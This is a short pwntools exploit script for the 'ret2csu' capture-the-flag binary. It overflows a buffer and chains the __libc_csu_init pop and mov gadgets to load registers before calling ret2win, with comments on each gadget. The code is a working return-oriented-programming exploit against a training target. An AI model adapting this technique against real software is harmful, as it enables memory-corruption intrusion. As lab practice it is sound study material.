from pwn import *

elf = ELF('./ret2csu')
io = elf.process()

raw_input("do magic ?")

pld = b""
pld += b"\x90" * 40
#------------------------------
# second important gadgets

#   0x0000000000400680 <+64>:	mov    rdx,r15
#   0x0000000000400683 <+67>:	mov    rsi,r14
#   0x0000000000400686 <+70>:	mov    edi,r13d
#   0x0000000000400689 <+73>:	call   QWORD PTR [r12+rbx*8]

#*****************
# first important gadgets

# 0x000000000040069a <+90>:	pop    rbx
# 0x000000000040069b <+91>:	pop    rbp
# 0x000000000040069c <+92>:	pop    r12
# 0x000000000040069e <+94>:	pop    r13
# 0x00000000004006a0 <+96>:	pop    r14
# 0x00000000004006a2 <+98>:	pop    r15
# 0x00000000004006a4 <+100>:	ret

#------------------------------

# 0x0000000000601028 data section


pld += p64(0x000000000040069a) # pop all register
pld += p64(0) #rbx
pld += p64(1) #rbp

pld += p64(0x4003b0) # --> this address points to _fini (manual searching sections with objdump)
pld += p64(0xdeadbeefdeadbeef) # r13
pld += p64(0xcafebabecafebabe) #r14
pld += p64(0xd00df00dd00df00d) #r15

pld += p64(0x0000000000400680) # second gadget controling rdi , rsi , rdx

pld += p64(0) # add rsp 0x8 after returning from _fini
#after return _fini the execution resums poping register till it hits ret instruction
pld += p64(0)
pld += p64(0)
pld += p64(0)
pld += p64(0)
pld += p64(0)
pld += p64(0)

pld += p64(0x00000000004006a3) #  : pop rdi ; ret
pld += p64(0xdeadbeefdeadbeef) # rdi

pld += p64(elf.plt['ret2win']) 

io.sendlineafter(b"> ", pld)


io.interactive()
